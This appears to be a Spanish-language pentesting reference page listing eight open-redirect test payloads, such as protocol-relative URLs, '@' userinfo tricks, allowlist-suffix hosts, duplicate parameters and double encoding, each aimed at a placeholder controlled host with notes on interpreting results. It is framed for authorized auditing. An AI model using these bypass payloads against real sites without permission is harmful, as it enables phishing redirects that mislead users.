# 🗡️ Open redirect: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. URL absoluta

**Objetivo:** Confirmar si next acepta URL externa propia.

```http
GET /redirect?next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Confirmar Location o navegación hacia el host controlado; un 200 con texto no es redirect.

**Fuente técnica:** [documentación de la técnica](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).

### 2. URL relativa a protocolo

**Objetivo:** Probar un destino // que hereda el esquema.

```http
GET /redirect?next=%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Verificar Location y destino final en navegador; algunos frameworks convierten a ruta local.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 3. Userinfo con @

**Objetivo:** Distinguir host real de texto antes de @.

```text
https://{HOST_PERMITIDO}@{CONTROLLED_HOST}/prueba
```

**Interpretación:** El host efectivo es el situado después de @; usar solo si la validación parece comparar texto de URL.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 4. Sufijo de allowlist

**Objetivo:** Probar coincidencia por prefijo sin límite de host.

```text
https://{HOST_PERMITIDO}.{CONTROLLED_HOST}/prueba
```

**Interpretación:** Solo funciona si el host resultante es del auditor y el validador acepta una comparación incompleta.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 5. Parámetro duplicado

**Objetivo:** Detectar si validador y consumidor eligen valores distintos.

```http
GET /redirect?next=%2Fcuenta&next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comparar también cada parámetro solo; no concluir bypass por diferencias de parser sin redirección externa.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 6. Ruta de redirección

**Objetivo:** Probar aplicaciones que incorporan el destino en la ruta.

```http
GET /redirect/https://{CONTROLLED_HOST}/prueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Verificar si el router captura la URL completa y genera Location externo.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 7. Codificación doble

**Objetivo:** Identificar un segundo decode después de validar.

```http
GET /redirect?next=https%253A%252F%252F{CONTROLLED_HOST}%252Fprueba HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La respuesta debe mostrar destino externo tras dos capas; una cadena codificada sin navegación no confirma.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

### 8. Redirección DOM

**Objetivo:** Observar si JavaScript cliente asigna location desde un fragmento.

```text
https://{ORIGEN}/redirect#https://{CONTROLLED_HOST}/prueba
```

**Interpretación:** Solo aplica si el script lee location.hash y navega; documentar la línea de código o el efecto.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
